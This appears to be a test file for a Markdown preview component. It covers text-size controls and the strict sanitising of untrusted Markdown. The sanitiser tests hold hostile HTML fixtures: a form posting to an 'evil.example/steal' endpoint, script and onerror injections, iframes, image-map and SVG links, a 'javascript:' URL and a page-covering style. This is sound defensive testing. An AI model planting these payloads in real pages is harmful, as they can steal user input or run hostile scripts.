// Text size for rendered markdown: one size for every preview, changed by the A−/A+ controls or
// Ctrl+scroll, and remembered.
import React from 'react'
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { render, screen, fireEvent, cleanup } from '@testing-library/react'
import { MarkdownPreview, TextSizeControls, useMarkdownTextSize, stepTextSize, TEXT_SIZES, followPreviewLink } from './markdown-preview.jsx'

function Viewer({ label }) {
  const [size, setSize] = useMarkdownTextSize()
  return (
    <section aria-label={label}>
      <TextSizeControls size={size} onChange={setSize} />
      <MarkdownPreview markdown="# Title" aria-label={`${label} preview`} />
    </section>
  )
}

const sizeOf = label => screen.getByLabelText(`${label} preview`).style.fontSize

beforeEach(() => localStorage.clear())
afterEach(cleanup)

describe('stepTextSize', () => {
  it('steps through the sizes and stops at either end', () => {
    expect(stepTextSize(100, 1)).toBe(110)
    expect(stepTextSize(100, -1)).toBe(90)
    expect(stepTextSize(TEXT_SIZES[0], -1)).toBe(TEXT_SIZES[0])
    expect(stepTextSize(TEXT_SIZES.at(-1), 1)).toBe(TEXT_SIZES.at(-1))
    expect(stepTextSize(123, 1)).toBe(110)
  })
})

describe('text size', () => {
  it('starts at 100%, and A+, A− and the reset change it', () => {
    render(<Viewer label="One" />)
    expect(sizeOf('One')).toBe('100%')
    fireEvent.click(screen.getByRole('button', { name: 'Larger text' }))
    fireEvent.click(screen.getByRole('button', { name: 'Larger text' }))
    expect(sizeOf('One')).toBe('125%')
    expect(screen.getByRole('button', { name: 'Reset text size' }).textContent).toBe('125%')
    fireEvent.click(screen.getByRole('button', { name: 'Smaller text' }))
    expect(sizeOf('One')).toBe('110%')
    fireEvent.click(screen.getByRole('button', { name: 'Reset text size' }))
    expect(sizeOf('One')).toBe('100%')
  })

  it('is one size for every preview showing, and is remembered', () => {
    render(<><Viewer label="One" /><Viewer label="Two" /></>)
    fireEvent.click(screen.getAllByRole('button', { name: 'Larger text' })[0])
    expect(sizeOf('Two')).toBe('110%')
    cleanup()
    render(<Viewer label="Later" />)
    expect(sizeOf('Later')).toBe('110%')
  })

  it('ignores a remembered size that is not one of the sizes', () => {
    localStorage.setItem('nexusmd.markdown.textSize', '9999')
    render(<Viewer label="One" />)
    expect(sizeOf('One')).toBe('100%')
  })

  it('changes with Ctrl+scroll over the preview, and leaves plain scrolling alone', () => {
    render(<Viewer label="One" />)
    const el = screen.getByLabelText('One preview')
    expect(fireEvent.wheel(el, { deltaY: -100 })).toBe(true)
    expect(sizeOf('One')).toBe('100%')
    // Not cancelled by default would mean the page zooms too.
    expect(fireEvent.wheel(el, { deltaY: -100, ctrlKey: true })).toBe(false)
    expect(sizeOf('One')).toBe('110%')
    fireEvent.wheel(el, { deltaY: 100, ctrlKey: true })
    fireEvent.wheel(el, { deltaY: 100, ctrlKey: true })
    expect(sizeOf('One')).toBe('90%')
  })

  it('stops at the smallest and largest sizes', () => {
    render(<Viewer label="One" />)
    const smaller = screen.getByRole('button', { name: 'Smaller text' })
    for (let i = 0; i < TEXT_SIZES.length; i++) fireEvent.click(smaller)
    expect(sizeOf('One')).toBe(`${TEXT_SIZES[0]}%`)
    expect(smaller.disabled).toBe(true)
  })
})

describe('strict rendering of untrusted Markdown', () => {
  const HOSTILE = [
    '# Title', '',
    '<form action="https://evil.example/steal" method="post"><input name="x"><button type="submit">Go</button></form>', '',
    '<textarea>t</textarea><select><option>o</option></select><iframe src="https://evil.example"></iframe>', '',
    '<a href="https://ok.example" formaction="https://evil.example">link</a>', '',
    '<script>window.hacked = 1</script><img src="x" onerror="window.hacked = 2">', '',
  ].join('\n')
  const html = strict => {
    const { container } = render(<MarkdownPreview markdown={HOSTILE} strict={strict} />)
    return container.querySelector('.md-content')
  }

  it('drops forms, inputs, buttons, textareas, selects and frames, and the attributes that submit', () => {
    const el = html(true)
    for (const tag of ['form', 'input', 'button', 'textarea', 'select', 'iframe', 'script']) expect(el.querySelector(tag)).toBeNull()
    expect(el.querySelector('[action], [formaction], [onerror]')).toBeNull()
    expect(el.querySelector('h1').textContent).toBe('Title')
    expect(el.querySelector('a').getAttribute('href')).toBe('https://ok.example')
  })

  it('still strips scripts and event handlers without it, as before', () => {
    const el = html(false)
    expect(el.querySelector('script')).toBeNull()
    expect(el.querySelector('[onerror]')).toBeNull()
  })
})

describe('strict rendering: what else a README must not carry', () => {
  const HOSTILE = [
    '# Title', '',
    '<img src="x.png" usemap="#m"><map name="m"><area shape="rect" coords="0,0,99,99" href="https://evil.example/"></map>', '',
    '<svg viewBox="0 0 10 10"><a xlink:href="https://evil.example/"><rect width="10" height="10"/></a></svg>', '',
    '<style>body { display: none }</style>', '',
    '<p style="position:fixed;inset:0;z-index:9999">cover</p>', '',
  ].join('\n')
  const strictEl = () => render(<MarkdownPreview markdown={HOSTILE} strict />).container.querySelector('.md-content')

  it('drops image maps, svg, style blocks and style attributes', () => {
    const el = strictEl()
    for (const tag of ['map', 'area', 'svg', 'style']) expect(el.querySelector(tag)).toBeNull()
    expect(el.querySelector('[usemap], [style], [xlink\\:href]')).toBeNull()
    expect(el.querySelector('h1').textContent).toBe('Title')
  })
})

describe('followPreviewLink', () => {
  const clickOn = (html, selector, options) => {
    const box = document.createElement('div')
    box.innerHTML = html
    document.body.appendChild(box)
    const target = box.querySelector(selector)
    const event = new MouseEvent('click', { bubbles: true, cancelable: true })
    Object.defineProperty(event, 'target', { value: target })
    followPreviewLink(event, box, options)
    box.remove()
    return event
  }

  it('stops a click on an image-map area or an svg link from navigating the window, and opens http(s) as a tab', () => {
    const open = vi.fn()
    const area = clickOn('<map><area href="https://evil.example/x"></map>', 'area', { open, openExternal: undefined })
    expect(area.defaultPrevented).toBe(true)
    expect(open).toHaveBeenCalledWith('https://evil.example/x')
    const svgLink = clickOn('<svg><a href="javascript:alert(1)"><rect/></a></svg>', 'a', { open, openExternal: undefined })
    expect(svgLink.defaultPrevented).toBe(true)
    expect(open).toHaveBeenCalledTimes(1)
  })
})
